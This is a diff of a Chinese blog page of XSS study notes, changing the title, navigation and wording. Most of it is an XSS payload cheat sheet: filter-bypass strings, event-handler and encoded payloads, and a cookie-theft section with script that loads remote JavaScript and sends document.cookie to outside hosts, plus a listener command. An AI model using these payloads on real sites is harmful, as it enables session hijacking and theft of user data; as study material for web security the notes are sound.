@@ -19,7 +19,7 @@ if (!doNotTrack) {
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>
       
-  XSS漏洞学习笔记 &ndash; 阿富的在线稿子
+  XSS漏洞学习笔记 &ndash; Arefu&#39;s Playground
 
     </title>
     
@@ -27,7 +27,7 @@ if (!doNotTrack) {
     <meta name="description" property="og:description" content="Cross Site Script 跨站脚本攻击|blog under go1f.cc">
     
 
-    <meta name="apple-mobile-web-app-title" content="阿富的在线稿子">
+    <meta name="apple-mobile-web-app-title" content="Arefu&#39;s Playground">
     
     
     <link rel="icon" href="/favicon-64.png">
@@ -39,7 +39,7 @@ if (!doNotTrack) {
     <meta name="twitter:card" content="summary">
     <meta name="twitter:site" content="@">
     <meta name="twitter:creator" content="@">
-    <meta name="twitter:title" content="XSS漏洞学习笔记 | 阿富的在线稿子">
+    <meta name="twitter:title" content="XSS漏洞学习笔记 | Arefu&#39;s Playground">
     <meta name="twitter:description" content="Cross Site Script 跨站脚本攻击|blog under go1f.cc">
     <meta name="twitter:image" content="https://blog.go1f.cc/twitter-card.png">
     
@@ -57,7 +57,7 @@ if (!doNotTrack) {
       <div id="header" class="px-1 bg-white">
         <nav class="UnderlineNav UnderlineNav--right px-2">
   <a class="UnderlineNav-actions muted-link h2" href="https://blog.go1f.cc/">
-    阿富的在线稿子
+    Arefu&#39;s Playground
   </a>
 
   
@@ -85,14 +85,6 @@ if (!doNotTrack) {
     <a class="UnderlineNav-item " href="/blog/">
       
       <span>博客</span>
-    </a>
-    
-    
-    
-    
-    <a class="UnderlineNav-item " href="/about/">
-      
-      <span>简历</span>
     </a>
     
     
@@ -127,9 +119,9 @@ if (!doNotTrack) {
 
     
     <div class="float-md-right">
-      <span title="Lastmod: 2020-02-10. Published at: 2020-02-01.">
+      <span title="Lastmod: 2020-02-15. Published at: 2020-02-01.">
         
-          Lastmod: 2020-02-10
+          Lastmod: 2020-02-15
         
       </span>
     </div>
@@ -139,17 +131,16 @@ if (!doNotTrack) {
 <article>
   
   <section class="pb-6 mb-3 border-bottom">
-    <p>XSS漏洞学习笔记</p>
-<p>多得有幸拜读前人的分享，高层的抽象思想，让我能够整理XSS学习笔记，整理出来一点条理。</p>
+    <p>有幸获得前辈的分享，高层的概括受益匪浅（见文尾），得以对XSS整理出一点条理。</p>
 <p>​</p>
 <p><strong>两个条件</strong></p>
 <p>可以控制的输入点、输入能返回到前端页面上被浏览器当成脚本语言执行</p>
 <p><strong>应用</strong></p>
-<p>Cookie窃取、键盘记录、客户端信息探查    内网IP、XSS getshell、页面劫持、XSS蠕虫 如 新浪微博/人人网</p>
+<p>Cookie窃取、键盘记录、客户端信息探查/内网IP、XSS getshell、页面劫持、XSS蠕虫 如 新浪微博/人人网</p>
 <p>​</p>
 <h2 id="测试xss">测试XSS</h2>
 <p><a href="https://www.freebuf.com/articles/web/153055.html">XSS过滤绕过速查表</a></p>
-<pre><code>&quot;&quot;;!–&lt;img&gt;=&amp;{()}
+<pre><code>&quot;&quot;;=''&amp;!–/&lt;img&gt;{()}
 </code></pre><p><a href="https://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html">Bypass xss过滤的测试方法- 五道口杀气</a></p>
 <p>Javascript输出/交互方式</p>
 <div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;XssHere&#34;</span><span class="p">)</span>
@@ -160,12 +151,10 @@ if (!doNotTrack) {
 </code></pre></div><p>​</p>
 <h2 id="如何执行xss语句">如何执行XSS语句</h2>
 <h3 id="闭合标签">闭合标签</h3>
-<p>闭合标签</p>
-<p>前闭合，后注释。</p>
-<p>大敌克星：htmlspecialchars ( 转换<code>&amp;</code> 、 双引号<code>&quot;</code> 、单引号<code>'</code> 、左右尖括号<code>&gt;</code> 、<code>&lt;</code>  为实体编码)</p>
-<p><code>$#x0a;</code>、 <code>$#x0d;</code>、  <code>/</code> 、反引号(重音符)等，可起到字符分割作用</p>
+<p>要诀：前闭合，后注释。</p>
+<p>输出克星：htmlspecialchars ( 转换<code>&amp;</code> 、 双引号<code>&quot;</code> 、单引号<code>'</code> 、左右尖括号<code>&gt;</code> 、<code>&lt;</code>  为实体编码)</p>
+<p>可起到字符分割作用的符号：<code>$#x0a;</code>、 <code>$#x0d;</code>、  <code>/</code> 、反引号(重音符)等，</p>
 <div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">details</span><span class="err">/</span><span class="na">ontoggle</span><span class="o">=</span><span class="s">&#34;alert(1)&#34;</span><span class="p"></span><span class="p">&gt;</span>
-
 <span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x%0donerror=%0aalert(/xss/)</span><span class="p"></span><span class="p">&gt;</span>
 </code></pre></div><p>​</p>
 <h3 id="闭合属性利用事件">闭合属性/利用事件</h3>
@@ -185,7 +174,7 @@ if (!doNotTrack) {
 <div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">1</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&#34;javascript:alert(/xss/)&#34;</span><span class="p"></span><span class="p">&gt;</span>
 </code></pre></div><div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!--</span><span class="c">加载外部js</span><span class="c">--&gt;</span>
 <span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">document.body.appendChild(document.createElement(&#39;script&#39;)).src=</span>
-     <span class="err">&#39;</span><span class="err">/</span><span class="err">/</span><span class="na">go1f</span><span class="err">.</span><span class="na">cc:8000</span><span class="err">/</span><span class="na">xss</span><span class="err">/</span><span class="na">myjs</span><span class="err">/</span><span class="na">cookie</span><span class="err">.</span><span class="na">js</span><span class="err">&#39;</span><span class="p"></span><span class="p">&gt;</span>
+     <span class="err">&#39;</span><span class="err">/</span><span class="err">/</span><span class="na">attack</span><span class="err">.</span><span class="na">com</span><span class="err">/</span><span class="na">xss</span><span class="err">/</span><span class="na">myjs</span><span class="err">/</span><span class="na">cookie</span><span class="err">.</span><span class="na">js</span><span class="err">&#39;</span><span class="p"></span><span class="p">&gt;</span>
 
 <span class="c">&lt;!--</span><span class="c">加载外部js(依赖jQuery)</span><span class="c">--&gt;</span>
 <span class="p">&lt;</span><span class="nt">svg</span> <span class="na">onmouseover</span><span class="o">=</span><span class="s">&#34;$.getScript`https://cnrichard.cn/a.js`&#34;</span> <span class="na">stype</span><span class="o">=</span><span class="s">&#34;display:none&#34;</span><span class="p"></span><span class="p">&gt;</span>
@@ -196,17 +185,17 @@ if (!doNotTrack) {
 <div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;javascript:alert(&#39;a&#39;)&#34;</span><span class="p"></span><span class="p">&gt;</span>DO NOT CLICK!!<span class="p">&lt;</span><span class="p">/</span><span class="nt">a</span><span class="p">&gt;</span>
 </code></pre></div><p>​</p>
 <p><strong>data伪协议</strong></p>
-<p>iframe、object标签会加载url内容(js代码)到浏览器，并获得js的执行。</p>
+<p>借助iframe、object标签加载js代码</p>
 <div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">object</span> <span class="na">data</span><span class="o">=</span>
-        <span class="s">&#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgnYScpPC9zY3JpcHQ+&#34;</span><span class="p"></span><span class="p">&gt;</span><span class="p">&lt;</span><span class="p">/</span><span class="nt">object</span><span class="p">&gt;</span>
+<span class="s">&#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgnYScpPC9zY3JpcHQ+&#34;</span><span class="p"></span><span class="p">&gt;</span><span class="p">&lt;</span><span class="p">/</span><span class="nt">object</span><span class="p">&gt;</span>
 
 <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;data:text/html,&lt;script&gt;alert(&#39;a&#39;)&lt;/script&gt;&#34;</span><span class="p"></span><span class="p">&gt;</span><span class="p">&lt;</span><span class="p">/</span><span class="nt">iframe</span><span class="p">&gt;</span>
 </code></pre></div><p>​</p>
 <h3 id="特殊属性">特殊属性</h3>
-<p>利用src属性走JavaScript等伪协议执行js，貌似已经被现代浏览器的特性屏蔽掉了。</p>
-<p>href属性</p>
+<p>利用src属性走JavaScript等伪协议执行js，但一些标签例如img，本人在chrome、firefox已测试失效。</p>
+<p><strong>href属性</strong></p>
 <div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;javascript:alert(&#39;a&#39;)&#34;</span><span class="p"></span><span class="p">&gt;</span>DO NOT CLICK!!<span class="p">&lt;</span><span class="p">/</span><span class="nt">a</span><span class="p">&gt;</span>
-</code></pre></div><p>action属性，form表单常见，执行js</p>
+</code></pre></div><p><strong>action属性</strong> form表单可见，可执行js</p>
 <p>​</p>
 <h2 id="xss编码">XSS编码</h2>
 <h3 id="解码顺序">解码顺序</h3>
@@ -230,26 +219,32 @@ if (!doNotTrack) {
 <p>​	3. 位置: <code>http://www.jiayzhan.org</code>，无论如何，浏览器会对其进行：URL解码</p>
 <p>​	4. 位置：<code>jiayzhan’s URL</code>， 无论如何，浏览器会对此位置字符串进行：1）先JavaScript解码 (JS编解码请<a href="http://www.w3schools.com/js/js_obj_string.asp">参考</a>）  2）后URL解码</p>
 </blockquote>
-<p><strong>灵活运用不同标签解码特性，增加编码混淆，绕过过滤器！！！</strong></p>
+<p>​</p>
+<p><strong>！！！灵活运用不同标签解码特性，增加编码混淆，绕过过滤器！！！</strong></p>
 <p>​</p>
 <h3 id="编码形式">编码形式</h3>
 <p>敏感字符串： 【<code>&lt;/&gt;&quot;&amp;#=-'&quot;</code>】</p>
 <p>​</p>
-<p>HTML编码-1: 【<code>&amp;#60;&amp;#47;&amp;#62;&amp;#8221;&amp;#38;&amp;#35;&amp;#61;&amp;#45;&amp;#8217;&amp;#8221;</code>】//10进制</p>
-<p>HTML编码-2: 【<code>&amp;#x3C;&amp;#x2F;&amp;#x3E;&amp;#x201D;&amp;#x26;&amp;#x23;&amp;#x3D;&amp;#x2D;&amp;#x2019;&amp;#x201D;</code>】//16进制</p>
-<p>HTML编码-3: 【<code>&amp;lt;/&amp;gt;&amp;quot;&amp;amp;#=-&amp;#39;&amp;quot;</code>】//别名法</p>
-<p>​</p>
-<p>JS编码-1: 【<code>\&lt;\/\&gt;\&quot;\&amp;\#\=\-\'\&quot;</code>】//<code>\</code>+字符，转义</p>
-<p>JS编码-2: 【<code>\x3C\x2F\x3E\x22\x26\x23\x3D\x2D\x27\x22</code>】//16进制</p>
-<p>JS编码-3：【<code>\u003C\u002F\u003E\u0022\u0026\u0023\u003D\u002D\u0027\u0022</code>】//Unicode</p>
+<p>//10进制</p>
+<p>HTML编码-1: 【<code>&amp;#60;&amp;#47;&amp;#62;&amp;#8221;&amp;#38;&amp;#35;&amp;#61;&amp;#45;&amp;#8217;&amp;#8221;</code>】</p>
+<p>//16进制</p>
+<p>HTML编码-2: 【<code>&amp;#x3C;&amp;#x2F;&amp;#x3E;&amp;#x201D;&amp;#x26;&amp;#x23;&amp;#x3D;&amp;#x2D;&amp;#x2019;&amp;#x201D;</code>】</p>
+<p>//别名法</p>
+<p>HTML编码-3: 【<code>&amp;lt;/&amp;gt;&amp;quot;&amp;amp;#=-&amp;#39;&amp;quot;</code>】</p>
+<p>//<code>\</code>+字符，转义</p>
+<p>JS编码-1: 【<code>\&lt;\/\&gt;\&quot;\&amp;\#\=\-\'\&quot;</code>】</p>
+<p>//16进制</p>
+<p>JS编码-2: 【<code>\x3C\x2F\x3E\x22\x26\x23\x3D\x2D\x27\x22</code>】</p>
+<p>//Unicode</p>
+<p>JS编码-3：【<code>\u003C\u002F\u003E\u0022\u0026\u0023\u003D\u002D\u0027\u0022</code>】</p>
 <p>​</p>
 <p>URL编码：【<code>%3c%2f%3e%22%26%23%3d%2d%27%22</code>】</p>
 <p>​</p>
 <h3 id="实体编码">实体编码</h3>
 <p>HTML解析器只能正常识别、解析、运行在html标签里的<strong>参数或属性值里</strong>的实体编码</p>
-<p>“原码”</p>
+<p><strong>示例</strong></p>
 <div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(&#39;xss&#39;)</span><span class="p"></span><span class="p">&gt;</span>
-</code></pre></div><p>十六进制字符实体，<a href="https://www.qqxiuzi.cn/bianma/zifushiti.php">在线转换</a></p>
+</code></pre></div><p>十六进制字符实体 —— <a href="https://www.qqxiuzi.cn/bianma/zifushiti.php">一个不错的实体在线转换网站</a></p>
 <div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">a&amp;#x6C;ert(&amp;#x27;xss&amp;#x27;)</span><span class="p"></span><span class="p">&gt;</span>
 </code></pre></div><p>十进制字符实体</p>
 <div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">a&amp;#108;ert(&amp;#39;xss&amp;#39;)</span><span class="p"></span><span class="p">&gt;</span>
@@ -257,7 +252,7 @@ if (!doNotTrack) {
 <div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">a&amp;#0000108ert(&amp;#0000039xss&amp;#0000039)</span><span class="p"></span><span class="p">&gt;</span>
 </code></pre></div><p>​</p>
 <h3 id="进制编码">进制编码</h3>
-<p>JavaScript代码解析前会进行js解码</p>
+<p>JavaScript代码解析前会JS解码方法内的参数</p>
 <div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!--</span><span class="c">十进制ASCII码</span><span class="c">--&gt;</span>
 <span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">/</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(String.fromCharCode(88,83,83))</span><span class="p"></span><span class="p">&gt;</span><span class="p">&lt;</span><span class="p">/</span><span class="nt">img</span><span class="p">&gt;</span>
 <span class="p">&lt;</span><span class="nt">script</span><span class="p"></span><span class="p">&gt;</span><span class="nb">eval</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">97</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">41</span><span class="p">)</span><span class="p">)</span><span class="p">&lt;</span><span class="p">/</span><span class="nt">script</span><span class="p">&gt;</span>
@@ -295,23 +290,23 @@ if (!doNotTrack) {
 <p>读取  <code>document.cookie</code></p>
 </li>
 <li>
-<p>设置 cookie   <code>document.cookie = &quot;uname=bca&quot;</code></p>
+<p>设置  <code>document.cookie = &quot;uname=bca&quot;</code></p>
 </li>
 <li>
-<p>删除 cookie  <code>document.cookie = &quot;Sessionid=' ';expires=&quot;+Date()</code></p>
+<p>删除  <code>document.cookie = &quot;Sessionid=' ';expires=&quot;+Date()</code></p>
 </li>
 </ul>
 <p>​</p>
 <p><strong>简单示例</strong></p>
-<p>构造js，借助<strong>XHR</strong>，发送cookie到攻击机</p>
+<p>构造<strong>XHR</strong>，发送cookie到攻击机</p>
 <div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p"></span><span class="p">&gt;</span>
 	<span class="kd">var</span> <span class="nx">http</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">(</span><span class="p">)</span>
-	<span class="nx">http</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;POST&#34;</span><span class="p">,</span><span class="s2">&#34;http://go1f.cc:8000&#34;</span><span class="p">,</span><span class="kc">true</span><span class="p">)</span>
+	<span class="nx">http</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&#34;POST&#34;</span><span class="p">,</span><span class="s2">&#34;http://go1f.cc:81/xss/&#34;</span><span class="p">,</span><span class="kc">true</span><span class="p">)</span>
 	<span class="nx">http</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span>
 <span class="p">&lt;</span><span class="p">/</span><span class="nt">script</span><span class="p">&gt;</span>
 </code></pre></div><p>或者</p>
-<pre><code>&lt;!--src请求连接，夹带发送cookie--&gt;
-&lt;img src=x onerror=document.body.appendChild(document.createElement('img')).src='//go1f.cc:8000/?cookie='+document.cookie&gt;
+<pre><code>&lt;!--src请求夹带发送cookie--&gt;
+&lt;img src=x onerror=document.body.appendChild(document.createElement('img')).src='//go1f.cc:8000?cookie='+document.cookie&gt;
 </code></pre><p>攻击机开启监听接收</p>
 <div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh"> tcpdump port <span class="m">8000</span> -A
 </code></pre></div><p>​</p>
@@ -321,6 +316,7 @@ if (!doNotTrack) {
 <li><a href="https://www.ibm.com/developerworks/cn/java/j-lo-websocket-cross-site/index.html">深入理解跨站点 WebSocket 劫持漏洞的原理及防范</a></li>
 <li><a href="https://paper.seebug.org/papers/Archive/drops2/%E6%88%91%E7%9A%84%E9%80%9A%E8%A1%8C%E4%BD%A0%E7%9A%84%E8%AF%81.html">我的通行你的证</a></li>
 </ul>
+<p>​</p>
 <h2 id="xss平台辅助工具">XSS平台/辅助工具</h2>
 <p>自行搭建平台：<a href="https://github.com/firesunCN/BlueLotus_XSSReceiver">蓝莲花Blue-Lotus XSS</a>(已被删库)  ， 同类：xsserme、xsspt</p>
 <p>在线平台：XSS/DNS注入平台 <a href="http://ceye.io/profile">http://ceye.io</a>(疑已挂)</p>
